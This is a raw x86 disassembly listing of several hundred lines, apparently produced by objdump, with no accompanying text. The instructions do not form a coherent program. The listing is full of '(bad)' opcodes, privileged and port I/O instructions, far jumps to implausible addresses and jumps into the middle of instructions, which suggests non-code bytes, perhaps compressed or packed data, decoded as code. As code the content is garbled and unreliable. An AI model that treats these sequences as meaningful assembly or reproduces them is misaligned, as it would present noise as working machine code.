  417d8d:	jmp    FWORD PTR [edx+0x1f883911]
  417d93:	cmp    DWORD PTR [ebp-0x2d],ecx
  417d96:	xor    eax,0x67521754
  417d9b:	add    ah,dh
  417d9d:	adc    eax,0x91754148
  417da2:	jle    0x417d66
  417da4:	and    BYTE PTR [ebp-0x3b23f926],dh
  417daa:	mov    edx,0x310a668a
  417daf:	sbb    al,0xde
  417db1:	mov    ah,BYTE PTR [ecx]
  417db3:	in     al,dx
  417db4:	cmc    
  417db5:	cdq    
  417db6:	dec    ebx
  417db7:	rol    BYTE PTR [eax+0x21038c0],cl
  417dbd:	sbb    BYTE PTR [edi+0x576183c4],cl
  417dc3:	retf   0x7703
  417dc6:	rcl    BYTE PTR [eax-0x5e8ddbb5],cl
  417dcc:	mov    bh,BYTE PTR [esi]
  417dce:	push   es
  417dcf:	int3   
  417dd0:	int    0x97
  417dd2:	in     eax,dx
  417dd3:	pushf  
  417dd4:	pop    ecx
  417dd5:	adc    DWORD PTR [ebp+0x30],esi
  417dd8:	inc    eax
  417dd9:	adc    eax,0xb253359
  417dde:	sub    edi,DWORD PTR [esi+0x77]
  417de1:	xor    DWORD PTR [edi+0x69],edi
  417de4:	hlt    
  417de5:	rol    DWORD PTR [ecx+esi*2-0x5df28702],0xc5
  417ded:	test   ah,ch
  417def:	dec    esp
  417df0:	(bad)  
  417df1:	aad    0x22
  417df3:	pop    esp
  417df4:	pop    ebx
  417df5:	rcr    BYTE PTR [edi-0x68ad5e49],1
  417dfb:	sti    
  417dfc:	retf   0xdc97
  417dff:	and    edx,DWORD PTR [ecx]
  417e01:	icebp  
  417e02:	jns    0x417e49
  417e04:	fcom   DWORD PTR [ebx-0x57]
  417e07:	mov    edi,0xad891d47
  417e0c:	mov    cl,0xf5
  417e0e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417e0f:	call   0x457e512a
  417e14:	inc    ecx
  417e15:	ror    BYTE PTR [esi+0x54d75da0],0x71
  417e1c:	push   ebp
  417e1d:	aam    0x85
  417e1f:	sbb    DWORD PTR [eax],0xb0f0099a
  417e25:	outs   dx,BYTE PTR ds:[esi]
  417e26:	xchg   esp,eax
  417e27:	pop    esi
  417e28:	fs mov ebp,ss
  417e2b:	out    0xdd,eax
  417e2d:	pusha  
  417e2e:	xor    edi,DWORD PTR cs:[ecx]
  417e31:	pop    esp
  417e32:	pushf  
  417e33:	inc    ebx
  417e34:	mov    ebp,0xebc4a7fa
  417e39:	sbb    eax,0x5bc0bdcc
  417e3e:	jg     0x417e1f
  417e40:	addr16 aaa 
  417e42:	adc    DWORD PTR [eax],esi
  417e44:	mov    ds:0x5d2fe3f8,eax
  417e49:	or     al,0x88
  417e4b:	sub    eax,0x36e848aa
  417e50:	rol    DWORD PTR [ebx],cl
  417e52:	push   cs
  417e53:	retf   
  417e54:	push   es
  417e55:	xor    BYTE PTR [edi+0x58],0x97
  417e59:	xor    eax,0x8b5252f2
  417e5e:	retf   0x6775
  417e61:	or     ecx,DWORD PTR [esi]
  417e63:	shr    DWORD PTR [edi-0x6453fb7d],cl
  417e69:	adc    ah,BYTE PTR [edx-0x39b41be7]
  417e6f:	in     eax,dx
  417e70:	add    BYTE PTR [eax],0xc7
  417e73:	mov    ecx,0x32be0ab1
  417e78:	jle    0x417e1e
  417e7a:	sahf   
  417e7b:	test   esp,ebx
  417e7d:	enter  0x4344,0x28
  417e81:	xor    BYTE PTR [edx],bh
  417e83:	sbb    al,0xc3
  417e85:	daa    
  417e86:	dec    eax
  417e87:	pop    ss
  417e88:	rcr    BYTE PTR [ebp-0x1f45fe79],cl
  417e8e:	push   ds
  417e8f:	mov    ds:0x261c31bd,al
  417e94:	add    DWORD PTR [esi+ebx*8-0x2c786b46],ecx
  417e9b:	out    dx,eax
  417e9c:	sub    ecx,DWORD PTR [ecx-0x73]
  417e9f:	jmp    0x417e56
  417ea1:	imul   esi,DWORD PTR [esi],0xffffffdc
  417ea4:	mov    edx,0xba167e42
  417ea9:	dec    edx
  417eaa:	test   al,0xa7
  417eac:	pop    ss
  417ead:	cld    
  417eae:	mov    dl,BYTE PTR [esi+0x7b580251]
  417eb4:	sub    dh,BYTE PTR [esp+edi*8-0x44]
  417eb8:	sub    ebp,DWORD PTR [eax+0x73]
  417ebb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417ebc:	sbb    BYTE PTR es:[ecx+0x7],0xbf
  417ec1:	fmulp  st(4),st
  417ec3:	pop    ebp
  417ec4:	fld    DWORD PTR [edx+0x3d]
  417ec7:	and    DWORD PTR [edi+edi*8+0x1fac6128],esi
  417ece:	mov    BYTE PTR [edi+0x40],ah
  417ed1:	enter  0x2c8e,0x44
  417ed5:	das    
  417ed6:	lods   al,BYTE PTR es:[esi]
  417ed8:	ins    BYTE PTR es:[edi],dx
  417ed9:	sar    cl,cl
  417edb:	sbb    eax,0x75c84d1b
  417ee0:	push   eax
  417ee1:	fidiv  WORD PTR [eax+edi*2-0x2b]
  417ee5:	ret    
  417ee6:	psllq  mm0,QWORD PTR es:[ebx-0x3c7cdac6]
  417eee:	mov    esi,0x610d256d
  417ef3:	adc    al,0xff
  417ef5:	add    al,BYTE PTR [ebp-0xecf553e]
  417efb:	test   BYTE PTR [eax-0x41607abd],dh
  417f01:	gs mov bh,0x82
  417f04:	add    cl,BYTE PTR [esi+0x1f]
  417f07:	nop
  417f08:	arpl   sp,cx
  417f0a:	mov    ebp,0xef22dd4a
  417f0f:	jmpw   0x5515
  417f13:	repnz sbb al,0x27
  417f16:	sqrtps xmm7,XMMWORD PTR [eax-0x271e2443]
  417f1d:	je     0x417f90
  417f1f:	adc    ah,BYTE PTR [ebx]
  417f21:	imul   edx,DWORD PTR [edx],0xffffffce
  417f24:	push   0x12
  417f26:	xchg   BYTE PTR [ebp+0x68],bl
  417f29:	push   0xffffffb7
  417f2b:	mov    cl,0xf7
  417f2d:	mov    ds:0x9cad904c,al
  417f32:	pop    ss
  417f33:	jmp    0x25739362
  417f38:	or     edx,DWORD PTR [edx-0x7b418966]
  417f3e:	cwde   
  417f3f:	jmp    0x8c64:0x67dfc01f
  417f46:	and    eax,0x32de6a27
  417f4b:	xchg   BYTE PTR ds:0x589c6962,bh
  417f51:	loop   0x417fc2
  417f53:	dec    esp
  417f54:	test   al,0xf7
  417f56:	and    ebp,DWORD PTR [edi-0x3c2ac099]
  417f5c:	sub    ah,bl
  417f5e:	adc    ch,BYTE PTR [edx+ebx*8-0x3e]
  417f62:	mov    bh,0x54
  417f64:	sbb    eax,ebp
  417f66:	or     edx,DWORD PTR [esi+0x2c259133]
  417f6c:	cs inc eax
  417f6e:	pop    ebp
  417f6f:	imul   edi,DWORD PTR [esi+0x7ad2a395],0x1b
  417f76:	inc    ebp
  417f77:	fdivr  st,st(4)
  417f79:	(bad)
  417f7c:	and    al,0xe9
  417f7e:	sbb    DWORD PTR [edx-0x27],ecx
  417f81:	jne    0x417f2b
  417f83:	dec    esp
  417f84:	mov    bh,0x44
  417f86:	data16 sub cl,BYTE PTR [esi]
  417f89:	and    DWORD PTR [edi],0xffffffe4
  417f8c:	fdiv   st(3),st
  417f8e:	push   cs
  417f8f:	adc    eax,0xd38522ff
  417f94:	popa   
  417f95:	xor    bh,BYTE PTR ds:0xdacd59e5
  417f9b:	fwait
  417f9c:	add    eax,0x478102ee
  417fa1:	pop    edx
  417fa2:	xchg   ebx,eax
  417fa3:	xor    ecx,edx
  417fa5:	cli    
  417fa6:	mov    bl,0xc1
  417fa8:	mov    esi,cr5
  417fab:	arpl   WORD PTR [ebp-0x2b],di
  417fae:	sbb    eax,0x5495c74
  417fb3:	xor    al,dh
  417fb5:	inc    ebp
  417fb6:	outs   dx,DWORD PTR ds:[esi]
  417fb7:	data16 add BYTE PTR [ebx+esi*8+0x0],0x73
  417fbd:	in     al,dx
  417fbe:	xchg   ebx,eax
  417fbf:	jl     0x41800e
  417fc1:	mov    ch,0xa6
  417fc3:	shl    DWORD PTR [ecx+0x49860692],1
  417fc9:	and    al,0xbd
  417fcb:	(bad)  
  417fcc:	push   ds
  417fcd:	fsubrp st(6),st
  417fcf:	cs in  al,0x7f
  417fd2:	adc    eax,0x88943438
  417fd7:	not    DWORD PTR [edi]
  417fd9:	hlt    
  417fda:	xchg   esp,eax
  417fdb:	mov    bl,0xb2
  417fdd:	jmp    0x417f69
  417fdf:	sbb    ebx,edx
  417fe1:	ja     0x41800f
  417fe3:	push   edi
  417fe4:	test   eax,0x2aecd2bf
  417fe9:	test   al,0x62
  417feb:	mov    ebx,0xc24cd8f6
  417ff0:	mov    ds:0xd6255a8e,al
  417ff5:	jge    0x417fb2
  417ff7:	(bad)  
  417ff8:	xlat   BYTE PTR ds:[ebx]
  417ff9:	aad    0x3f
  417ffb:	(bad)  
  417ffc:	xlat   BYTE PTR ds:[ebx]
  417ffd:	(bad)  
  417ffe:	int3   
  417fff:	cmp    DWORD PTR [ecx+ebx*1-0x5a25c5f0],eax
  418006:	sub    eax,0x8e34cd05
  41800b:	jl     0x418036
  41800d:	adc    eax,0x66d94f28
  418012:	pop    es
  418013:	push   0x6004aceb
  418018:	jnp    0x417fa1
  41801a:	out    dx,eax
  41801b:	push   edi
  41801c:	int    0x6d
  41801e:	xchg   ebp,eax
  41801f:	cs loop 0x417fad
  418022:	cwde   
  418023:	(bad)  
  418024:	xchg   edx,eax
  418025:	loopne 0x41800b
  418027:	shl    BYTE PTR [ebx+edx*4-0x38],0x72
  41802c:	(bad)  
  41802d:	push   edx
  41802e:	cwde   
  41802f:	repnz dec esi
  418031:	xchg   edx,eax
  418032:	fmulp  st(7),st
  418034:	std    
  418035:	push   0xabb9d64a
  41803a:	cmp    eax,0x5386ed16
  41803f:	inc    eax
  418040:	inc    ebx
  418041:	xor    eax,0xeac4af4
  418046:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418047:	add    ecx,eax
  418049:	hlt    
  41804a:	add    esi,DWORD PTR [edi+ebx*1]
  41804d:	lea    edx,[ebp+0x2d0d123c]
  418053:	xchg   ebp,esi
  418055:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418056:	cmp    DWORD PTR [edi],esp
  418058:	int    0x3d
  41805a:	pop    esi
  41805b:	icebp  
  41805c:	js     0x418018
  41805e:	shl    BYTE PTR [esi+0x69a863e7],cl
  418064:	mov    ebx,DWORD PTR [eax-0x40]
  418067:	mov    esi,ebx
  418069:	js     0x4180dd
  41806b:	jp     0x418072
  41806d:	fstp   DWORD PTR [esi]
  41806f:	enter  0xacf,0x3f
  418073:	rcpps  xmm2,XMMWORD PTR [edx-0x7d3291d0]
  41807a:	cmp    ebp,DWORD PTR [edx+eax*1+0x39eb598a]
  418081:	sti    
  418082:	shr    al,0x91
  418085:	pop    edx
  418086:	cld    
  418087:	cmp    esp,DWORD PTR [ecx-0x20]
  41808a:	stc    
  41808b:	sub    esp,DWORD PTR [edx+0x6c]
  41808e:	push   ss
  41808f:	xor    DWORD PTR [ecx-0x5400c8fc],esi
  418095:	fldcw  WORD PTR [eax]
  418097:	sub    eax,0xd7f33fbe
  41809c:	push   edi
  41809d:	and    BYTE PTR [esi+edx*4+0x6410e944],cl
  4180a4:	sbb    BYTE PTR [ebx],al
  4180a6:	dec    esi
  4180a7:	or     ch,BYTE PTR [ecx+0x77e3b1f6]
  4180ad:	dec    edi
  4180ae:	call   0x9919a66c
  4180b3:	mov    WORD PTR [ebx],es
  4180b5:	push   0x22e00207
  4180ba:	xlat   BYTE PTR ds:[ebx]
  4180bb:	shr    ah,1
  4180bd:	in     eax,0x2a
  4180bf:	rol    BYTE PTR [ebx],1
  4180c1:	jne    0x4180ab
  4180c3:	push   ds
  4180c4:	sbb    esp,DWORD PTR [ecx-0xe893e6f]
  4180ca:	unpcklps xmm3,xmm1
  4180cd:	sbb    BYTE PTR [eax-0x7],bh
  4180d0:	sbb    DWORD PTR [ebp+0x40],edi
  4180d3:	loopne 0x418108
  4180d5:	mov    bh,cl
  4180d7:	mov    cl,0x61
  4180d9:	xor    dh,al
  4180db:	fcmovu st,st(6)
  4180dd:	dec    ecx
  4180de:	stos   DWORD PTR es:[edi],eax
  4180df:	(bad)  
  4180e0:	fmul   DWORD PTR [edi]
  4180e2:	push   ebp
  4180e3:	pop    edx
  4180e4:	loop   0x418158
  4180e6:	iret   
  4180e7:	pop    ds
  4180e8:	ds add bh,dh
  4180eb:	and    edi,DWORD PTR [eax]
  4180ed:	loopne 0x4180f6
  4180ef:	lods   eax,DWORD PTR ds:[esi]
  4180f0:	pop    edx
  4180f1:	das    
  4180f2:	sar    DWORD PTR [ebx+0x4e],cl
  4180f5:	inc    ebp
  4180f6:	jge    0x41816a
  4180f8:	je     0x418140
  4180fa:	mov    edx,0x9c8a060a
  4180ff:	imul   esp,DWORD PTR ds:0x7ce87157,0x2d
  418106:	push   ds
  418107:	in     eax,0xee
  418109:	cld    
  41810a:	repnz loop 0x4180e0
  41810d:	les    ebx,FWORD PTR [esi-0xfd90956]
  418113:	cli    
  418114:	xchg   ebx,eax
  418115:	inc    ecx
  418116:	cmp    DWORD PTR [ebx-0x3042117f],edx
  41811c:	add    cl,bh
  41811e:	mov    dl,0x90
  418120:	lea    edi,[edx+0x42]
  418123:	fdivp  st(0),st
  418125:	ds pop ebx
  418127:	cmp    edx,DWORD PTR [eax]
  418129:	pop    edi
  41812a:	in     eax,dx
  41812b:	pusha  
  41812c:	cld    
  41812d:	xor    edi,DWORD PTR [esi+0x195432da]
  418133:	or     ebp,edi
  418135:	popf   
  418136:	inc    esp
  418137:	dec    esp
  418138:	shl    DWORD PTR [edi],cl
  41813a:	and    eax,0x478930c6
  41813f:	adc    eax,0xebfa590
  418144:	sbb    bl,bl
  418146:	mov    cl,0xcf
  418148:	repnz jmp 0xc210:0x7dcbbc36
  418150:	lahf   
  418151:	pop    ecx
  418152:	push   0xffffffdc
  418154:	mov    bh,0xe6
  418156:	bound  edx,QWORD PTR [esi-0x7fb66d54]
  41815c:	frstor [eax]
  41815e:	(bad)  
  41815f:	push   ds
  418160:	mov    edx,0x8892782c
  418165:	mov    esp,edi
  418167:	inc    eax
  418168:	cmp    esp,esp
  41816a:	in     al,0xe4
  41816c:	or     eax,0xd857a5ff
  418171:	rcr    DWORD PTR [ebx+0x75],0x39
  418175:	shr    BYTE PTR [ebp-0x472a2c65],0xc5
  41817c:	mov    BYTE PTR [edi],0xbe
  41817f:	and    ecx,edx
  418181:	lea    edx,[ebp-0x66622e16]
  418187:	test   eax,0x286b1641
  41818c:	and    esp,DWORD PTR [eax-0x6df3e4eb]
  418192:	aam    0xaa
  418194:	lods   eax,DWORD PTR ds:[esi]
  418195:	nop
  418196:	push   0xffffffcf
  418198:	sub    bh,al
  41819a:	dec    ebp
  41819b:	inc    esi
  41819c:	mov    edx,0x2723294
  4181a1:	repz cmp esp,ecx
  4181a4:	cmp    edi,DWORD PTR [ebx+edx*2+0x54e16fac]
  4181ab:	mov    dh,0x65
  4181ad:	cli    
  4181ae:	sbb    eax,DWORD PTR [ebx]
  4181b0:	sub    dh,al
  4181b2:	sub    ebp,DWORD PTR [edx-0x35]
  4181b5:	add    dl,cl
  4181b7:	gs pop ds
  4181b9:	cmp    BYTE PTR [esp+ecx*1],cl
  4181bc:	jne    0x418163
  4181be:	test   esi,0xd7b4e3c6
  4181c4:	jle    0x418167
  4181c6:	push   esp
  4181c7:	mov    dh,0xa1
  4181c9:	loope  0x41820c
  4181cb:	jp     0x41817d
  4181cd:	or     dh,cl
  4181cf:	rol    DWORD PTR [ecx+0x31],0x17
  4181d3:	popa   
  4181d4:	fbstp  TBYTE PTR [edi+0x6229aa5e]
  4181da:	cmp    ebp,DWORD PTR [edi]
  4181dc:	bnd jg 0x418239
  4181df:	push   0xffffff8b
  4181e1:	out    0x66,eax
  4181e3:	fadd   DWORD PTR [eax-0x13c08121]
  4181e9:	std    
  4181ea:	mov    ch,0x7f
  4181ec:	ficom  DWORD PTR [eax-0x3aec1486]
  4181f2:	push   ecx
  4181f3:	mov    BYTE PTR ds:[edi-0x36],bl
  4181f7:	adc    dl,dl
  4181f9:	xchg   edx,eax
  4181fa:	ficom  WORD PTR [ebp+0x1178a6e1]
  418200:	add    eax,0xce75ec74
  418205:	cli    
  418206:	mov    esp,0x823a8b57
  41820b:	lahf   
  41820c:	popf   
  41820d:	push   0x2
  41820f:	dec    edx
  418210:	jno    0x418271
  418212:	xor    DWORD PTR [edx+0x6f],esi
  418215:	int3   
  418216:	enter  0xd551,0x9
  41821a:	dec    ecx
  41821c:	(bad)  
  41821d:	or     al,0x4
  41821f:	das    
  418220:	test   DWORD PTR [edi-0x65],esi
  418223:	add    esi,DWORD PTR [eax+0x692df14c]
  418229:	sub    ecx,edx
  41822b:	icebp  
  41822c:	push   ecx
  41822d:	(bad)  
  41822e:	or     BYTE PTR [esi],0x92
  418231:	dec    ebx
  418232:	pop    esi
  418233:	dec    ebx
  418234:	mov    ah,0x66
  418236:	lock int3 
  418238:	xchg   esp,eax
  418239:	retf   0xceed
  41823c:	outs   dx,BYTE PTR ds:[esi]
  41823d:	inc    ebp
  41823e:	pushf  
  41823f:	pop    ecx
  418240:	mov    edi,0x23d7847e
  418245:	xor    eax,0xf7d6351
  41824a:	leave  
  41824b:	dec    esi
  41824c:	bound  eax,QWORD PTR [edi-0x759321df]
  418252:	or     BYTE PTR [ebx+esi*2-0x61],0xa7
  418257:	cmp    eax,0x242f98e7
  41825c:	adc    DWORD PTR [bp+si+0xa],edi
  418260:	xchg   DWORD PTR [ebx-0x3a],ebp
  418263:	and    BYTE PTR [eax+0x5780c02],bh
  418269:	jb     0x4182cf
  41826b:	jmp    0xf928844f
  418270:	and    BYTE PTR [esp+ebp*4-0x2d9b3f7b],dl
  418277:	cs add edi,edx
  41827a:	icebp  
  41827b:	hlt    
  41827c:	clc    
  41827d:	sti    
  41827e:	nop
  41827f:	loope  0x4182d7
  418281:	mov    eax,0x7b350449
  418286:	jo     0x418210
  418288:	lock ror BYTE PTR [ecx-0x3d2a4a2],0x31
  418290:	sub    BYTE PTR [edi],bl
  418292:	push   es
  418293:	dec    ecx
  418294:	dec    ebp
  418295:	aas    
  418296:	or     ebp,DWORD PTR [edi+0x2e]
  418299:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41829a:	push   edi
  41829b:	inc    ecx
  41829c:	sahf   
  41829d:	dec    edx
  41829e:	bound  eax,QWORD PTR [ecx]
  4182a0:	xor    DWORD PTR [esi+0x6db70ba6],ecx
  4182a6:	pusha  
  4182a7:	arpl   WORD PTR [ebp+0x7c],sp
  4182aa:	shl    esp,1
  4182ac:	mov    BYTE PTR ds:0xaf6bbfda,bh
  4182b2:	cld    
  4182b3:	(bad)  [eax-0x44e607ef]
  4182b9:	cmp    BYTE PTR [ecx-0x41de765b],dh
  4182bf:	imul   edx,DWORD PTR [edi-0x32],0xae33f452
  4182c6:	out    dx,al
  4182c7:	and    al,0x1c
  4182c9:	add    dh,BYTE PTR [ecx-0x49]
  4182cc:	push   ds
  4182cd:	ret    
  4182ce:	daa    
  4182cf:	cmp    DWORD PTR [edx+0x56],edi
  4182d2:	call   0x2548:0x4f5c506
  4182d9:	in     al,dx
  4182da:	dec    ebx
  4182db:	pop    esi
  4182dc:	sti    
  4182dd:	or     BYTE PTR [eax-0x80],dh
  4182e0:	jmp    0x6efd5eef
  4182e5:	inc    ebx
  4182e6:	call   0xe327a924
  4182eb:	mov    edi,0x4f4b9746
  4182f0:	mov    dl,0xf6
  4182f2:	pop    esi
  4182f3:	cdq    
  4182f4:	mov    WORD PTR [esi+0x54],fs
  4182f7:	pusha  
  4182f8:	fcom   QWORD PTR [ebx+0x40]
  4182fb:	std    
  4182fc:	lds    ebp,FWORD PTR [edx-0x47]
  4182ff:	loop   0x418319
  418301:	xor    ebx,DWORD PTR [edi-0x1e82e377]
  418307:	pushf  
  418308:	imul   ah
  41830a:	cmc    
  41830b:	std    
  41830c:	pop    edi
  41830d:	jo     0x418316
  41830f:	inc    eax
  418310:	mov    DWORD PTR [edx-0x39],eax
  418313:	lods   eax,DWORD PTR ds:[esi]
  418314:	cld    
  418315:	cmp    ebp,DWORD PTR ds:0xd3e2ea59
  41831b:	jns    0x418354
  41831d:	(bad)  
  41831e:	mov    dh,0xd
  418320:	cmc    
  418321:	outs   dx,BYTE PTR ds:[esi]
  418322:	inc    esp
  418323:	iret   
  418324:	nop
  418325:	fwait
  418326:	dec    ecx
  418327:	or     al,BYTE PTR [esi-0x3c]
  41832a:	cmp    ch,BYTE PTR [ebx]
  41832c:	iret   
  41832d:	push   ebp
  41832e:	shl    DWORD PTR [ebx+0x72600f73],1
  418334:	mov    ds:0x6371de0e,al
  418339:	push   edi
  41833a:	mov    ch,0x72
  41833c:	cmp    BYTE PTR [esi],cl
  41833e:	inc    esi
  41833f:	mov    eax,ds:0x88a2e4f
  418344:	xchg   esp,eax
  418345:	jp     0x418386
  418347:	lods   al,BYTE PTR ds:[esi]
  418348:	cli    
  418349:	push   edx
  41834a:	sub    eax,0x512b025b
  41834f:	add    dh,dh
  418351:	out    0x29,eax
  418353:	or     eax,0x79012636
  418358:	outs   dx,BYTE PTR ds:[esi]
  418359:	(bad)
  41835c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41835d:	test   eax,0x150e3dab
  418362:	inc    edx
  418364:	push   eax
  418365:	pop    ebp
  418366:	mov    ecx,0x1844885a
  41836b:	(bad)  
  41836c:	sbb    edi,ecx
  41836e:	xchg   esi,eax
  41836f:	push   ecx
  418370:	(bad)
  418374:	data16 (bad) 
  418377:	and    BYTE PTR [ebx+eiz*2],cl
  41837a:	dec    ebp
  41837b:	xchg   esp,eax
  41837c:	jmp    0x418355
  41837e:	jb     0x418340
  418380:	lea    ecx,[edi-0x2]
  418383:	dec    edi
  418384:	or     dh,dh
  418386:	es jns 0x4183b6
  418389:	enter  0xfebc,0xee
  41838d:	cmp    BYTE PTR [eax+0x4d],ch
  418390:	in     al,dx
  418391:	jne    0x41833a
  418393:	push   cs
  418394:	xchg   ebx,eax
  418395:	rol    DWORD PTR [bp-0x4462],cl
  41839a:	pop    ss
  41839b:	xchg   esp,eax
  41839c:	in     al,dx
  41839d:	add    eax,esp
  41839f:	push   ebp
  4183a0:	sbb    ebp,ebx
  4183a2:	mov    ch,0xc9
  4183a4:	div    BYTE PTR [ecx-0x143db585]
  4183aa:	sbb    edx,ecx
  4183ac:	lods   al,BYTE PTR ds:[esi]
  4183ad:	add    al,0x85
  4183af:	(bad)  
  4183b0:	call   FWORD PTR [edi-0x37b6ab45]
  4183b6:	and    cl,BYTE PTR [ebx]
  4183b8:	test   edx,esi
  4183ba:	(bad)
  4183be:	es jge 0x418352
  4183c1:	in     eax,0xfc
  4183c3:	cdq    
  4183c4:	mov    ebx,0x448a0415
  4183c9:	mov    ebx,0x699b721a
  4183ce:	into   
  4183cf:	ret    0x7be9
  4183d2:	pusha  
  4183d3:	cwde   
  4183d4:	fnstsw WORD PTR [edi]
  4183d6:	ins    DWORD PTR es:[edi],dx
  4183d7:	sbb    eax,0xf2345672
  4183dc:	retf   0x362f
  4183df:	fst    DWORD PTR [esi-0x291005a7]
  4183e5:	sbb    BYTE PTR [edx+esi*4+0x558b30f6],al
  4183ec:	push   ss
  4183ed:	push   esp
  4183ee:	int    0x5
  4183f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4183f1:	aam    0x1f
  4183f3:	icebp  
  4183f4:	jmp    0x69cc3cf8
  4183f9:	loop   0x4183c4
  4183fb:	jmp    0x418478
  4183fd:	iret   
  4183fe:	fnstenv [ebp-0x17]
  418401:	mov    ebp,0xf7c7a54f
  418406:	inc    eax
  418407:	mov    BYTE PTR [ebp+0x7214876b],bl
  41840d:	outs   dx,DWORD PTR ds:[esi]
  41840e:	and    BYTE PTR [ebx-0x4],dl
  418411:	es mov DWORD PTR fs:[esi],edi
  418415:	loopne 0x418442
  418417:	loope  0x418489
  418419:	mov    ebp,DWORD PTR [ecx+0x59]
  41841c:	inc    BYTE PTR [edi-0x22dbccd3]
  418422:	jns    0x418490
  418424:	mov    esi,0x6197571d
  418429:	pop    edx
  41842a:	mov    al,0xdc
  41842c:	cmp    DWORD PTR [esi+0x317e14b4],edx
  418432:	pop    ds
  418433:	dec    esi
  418434:	sbb    eax,DWORD PTR [edx+0xd1198f4]
  41843a:	les    ebx,FWORD PTR [esi-0x281c232f]
  418440:	ficom  DWORD PTR [esi+0x7312d3bf]
  418446:	inc    esi
  418447:	adc    al,0x8b
  418449:	es in  al,0xe4
  41844c:	call   0x5a87aa92
  418451:	outs   dx,DWORD PTR ds:[esi]
  418452:	pushf  
  418453:	jmp    0x5077:0x6ddeb8b2
  41845a:	cmp    al,0xe6
  41845c:	jp     0x4183fc
  41845e:	mov    DWORD PTR [esp+edx*4-0x12],ecx
  418462:	inc    ebx
  418463:	stos   BYTE PTR es:[edi],al
  418464:	add    edi,DWORD PTR [ebp-0x73]
  418467:	gs in  eax,0x92
  41846a:	or     al,0x65
  41846c:	dec    edx
  41846d:	pop    esp
  41846e:	inc    esp
  41846f:	repz inc edx
  418471:	xor    al,0xd
  418473:	hlt    
  418474:	ror    BYTE PTR [edx+0x59546f33],0x2f
  41847b:	fstp   QWORD PTR [eax+ebp*8+0xc]
  41847f:	call   0x151b:0x2277b8ea
  418486:	imul   edx,DWORD PTR [ebx+0x5bcac72f],0xffffff85
  41848d:	mov    BYTE PTR ds:0xcddc6d9a,cl
  418493:	sbb    ebp,DWORD PTR [edi]
  418495:	mov    dh,0x99
  418497:	mov    ebp,0x54d6a382
  41849c:	jbe    0x418496
  41849e:	sub    DWORD PTR [ebp+0x72cfb41c],edx
  4184a4:	aam    0xc5
  4184a6:	dec    eax
  4184a7:	mov    dh,0x46
  4184a9:	xor    ch,dh
  4184ab:	mov    al,ds:0x260bb841
  4184b0:	dec    eax
  4184b1:	mov    ebx,0x934560e6
  4184b6:	stc    
  4184b7:	fistp  WORD PTR [ebx+0x5b36b7a]
  4184bd:	jns    0x4184c7
  4184bf:	mov    ebp,0xfa39c92d
  4184c4:	sbb    al,0xde
  4184c6:	sbb    eax,0xda62c9c8
  4184cb:	test   eax,0xa07d4e64
  4184d0:	imul   DWORD PTR [edx+0x486ab12e]
  4184d6:	aaa    
  4184d7:	sub    esp,DWORD PTR [edx+esi*1]
  4184da:	cmp    al,0xac
  4184dc:	ret    
  4184dd:	daa    
  4184de:	push   es
  4184df:	jp     0x41852a
  4184e1:	fistp  DWORD PTR [ebx-0x76d222fa]
  4184e7:	xchg   edi,eax
  4184e8:	test   eax,0xae3fda9e
  4184ed:	xchg   esp,eax
  4184ee:	or     edx,ebx
  4184f0:	push   edi
  4184f1:	repnz (bad) 
  4184f3:	dec    edi
  4184f4:	adc    eax,0x400f27af
  4184f9:	adc    ecx,ebp
  4184fb:	xchg   ebx,eax
  4184fc:	dec    eax
  4184fd:	inc    ecx
  4184fe:	imul   ebp,DWORD PTR [esi+0x51],0xffffffd6
  418502:	push   es
  418503:	fucomip st,st(3)
  418505:	xor    ch,BYTE PTR [eax-0x67ee627]
  41850b:	push   ds
  41850c:	sub    ecx,DWORD PTR [eax+esi*2]
  41850f:	mov    dh,0x57
  418511:	call   FWORD PTR [esi+0x42]
  418514:	fist   DWORD PTR [ebp+0x1e]
  418517:	fdivr  st(3),st
  418519:	and    dh,ah
  41851b:	mov    ds,WORD PTR [eax]
  41851d:	in     al,dx
  41851e:	imul   ebp,esp,0xffffffcb
  418521:	aam    0x2c
  418523:	sbb    eax,0x4b8e148f
  418528:	loop   0x418590
  41852a:	aad    0x46
  41852c:	mov    edx,0xbeb8cf10
  418531:	out    0xe4,eax
  418533:	cmp    eax,0xadbf5e9a
  418538:	add    ch,dl
  41853a:	xchg   esi,eax
  41853b:	je     0x41858f
  41853d:	jecxz  0x418599
  41853f:	mov    ah,0x96
  418541:	sbb    edi,DWORD PTR [esi+0x44b9e80]
  418547:	stos   DWORD PTR es:[edi],eax
  418548:	mov    al,ds:0x8d4a2f04
  41854d:	mov    ds:0x139f4dbb,al
  418552:	push   cs
  418553:	ficomp DWORD PTR [eax-0x799eea91]
  418559:	das    
  41855a:	rcr    BYTE PTR [eax],1
  41855c:	bound  esi,QWORD PTR [ebx-0x38]
  41855f:	dec    ebx
  418560:	out    dx,eax
  418561:	pop    ss
  418562:	rcl    DWORD PTR [ecx-0x7ac1fed1],cl
  418568:	mov    al,ds:0xb8477890
  41856d:	mov    ebp,0x570fdfe4
  418572:	push   ebx
  418573:	dec    ebx
  418574:	jo     0x418550
  418576:	dec    ebp
  418577:	jp     0x418596
  418579:	jbe    0x418525
  41857b:	stos   BYTE PTR es:[edi],al
  41857c:	out    0x6c,al
  41857e:	stos   DWORD PTR es:[edi],eax
  41857f:	test   ebx,edi
  418581:	ins    BYTE PTR es:[edi],dx
  418582:	add    DWORD PTR [eax],ecx
  418584:	loopne 0x418566
  418586:	mov    ah,0x5e
  418588:	jmp    0x7021:0x945a547a
  41858f:	enterw 0x400e,0x3d
  418594:	fwait
  418595:	push   eax
  418596:	(bad)
  418599:	xor    al,0x13
  41859b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41859c:	inc    eax
  41859d:	push   ebp
  41859e:	sbb    DWORD PTR [eax],ebx
  4185a0:	stc    
  4185a1:	sub    ah,BYTE PTR [eax-0x20482d86]
  4185a7:	enter  0xa767,0x2a
  4185ab:	xchg   ecx,eax
  4185ac:	mov    al,ds:0x9d116e7a
  4185b1:	sub    ebx,ebx
  4185b3:	sbb    eax,0xa0957fac
  4185b8:	cmp    eax,DWORD PTR [esi+0x54776f1b]
  4185be:	sti    
